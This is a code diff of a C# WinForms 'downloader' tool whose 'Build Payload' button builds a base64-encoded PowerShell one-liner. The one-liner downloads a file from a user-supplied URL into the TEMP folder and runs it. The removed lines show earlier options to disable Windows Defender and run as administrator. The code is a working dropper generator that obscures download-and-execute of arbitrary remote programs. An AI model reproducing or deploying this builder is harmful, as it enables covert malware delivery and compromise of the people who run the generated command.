@@ -1,4 +1,4 @@
-﻿using MetroFramework.Components;
+using MetroFramework.Components;
 using MetroFramework.Forms;
 using MetroFramework;
 using System;
@@ -12,6 +12,7 @@ namespace downloader
         public Form1()
         {
             InitializeComponent();
+            // Initialize MetroStyleManager to set the theme and style
             var styleManager = new MetroStyleManager();
             styleManager.Theme = MetroThemeStyle.Dark;
             styleManager.Style = MetroFramework.MetroColorStyle.Silver;
@@ -20,23 +21,25 @@ namespace downloader
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            // Set form properties: not resizable, no maximize button, no minimize button
             this.Resizable = false;
             this.MaximizeBox = false;
             this.MinimizeBox = false;
         }
+
         private void metroTextBox1_Click(object sender, EventArgs e)
         {
+            // Placeholder method, not used
         }
 
         private void buildpayload_Click(object sender, EventArgs e)
         {
-            bool disableWD = checkbox1.Checked;
-            bool runAsAdmin = checkbox2.Checked;
+            // Method called when "Build Payload" button is clicked
+            // Get input values
             string new_filename = filename_payload.Text;
             string url = payloadlink.Text;
-            string powerShellCommand = "";
-            string settingsJson = $"{{\"WD\": {(disableWD ? "true" : "false")}, \"adminrun\": {(runAsAdmin ? "true" : "false")}}}";
-            powerShellCommand += $"$settings = '{settingsJson}' | ConvertFrom-Json;";
+
+            // Generate a random string
             string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             string randomString = "";
             Random random = new Random();
@@ -44,18 +47,23 @@ namespace downloader
             {
                 randomString += characters[random.Next(characters.Length)];
             }
-            powerShellCommand += "$url = '" + url + "';"; 
-            powerShellCommand += "$outputPath = $env:TEMP + '\' + '" + new_filename + "';"; 
-            powerShellCommand += "(New-Object System.Net.WebClient).DownloadFile($url, $outputPath);"; 
-            powerShellCommand += "Start-Process $outputPath;";
+
+            // Construct PowerShell command
+            string powerShellCommand = "";
+            powerShellCommand += $"$url='{url}';$outputPath=$env:TEMP+'\\{new_filename}';(New-Object Net.WebClient).DownloadFile($url,$outputPath);Start-Process $outputPath;";
+            // Convert PowerShell command to base64
             byte[] bytes = Encoding.Unicode.GetBytes(powerShellCommand);
             string base64Payload = Convert.ToBase64String(bytes);
             powerShellCommand = "powershell -e " + base64Payload;
+
+            // Open payload window and execute PowerShell command
             payload_window form2 = new payload_window(powerShellCommand);
             form2.ShowDialog();
         }
+
         private void ExecuteCommand(string command)
         {
+            // Execute command using cmd.exe
             ProcessStartInfo processStartInfo = new ProcessStartInfo();
             processStartInfo.FileName = "cmd.exe";
             processStartInfo.Arguments = "/c " + command;
@@ -72,8 +80,10 @@ namespace downloader
                 process.WaitForExit();
             }
         }
-private void aboutbtn_Click(object sender, EventArgs e)
+
+        private void aboutbtn_Click(object sender, EventArgs e)
         {
+            // Method called when "About" button is clicked to show about window
             about_window form3 = new about_window();
             form3.ShowDialog();
         }
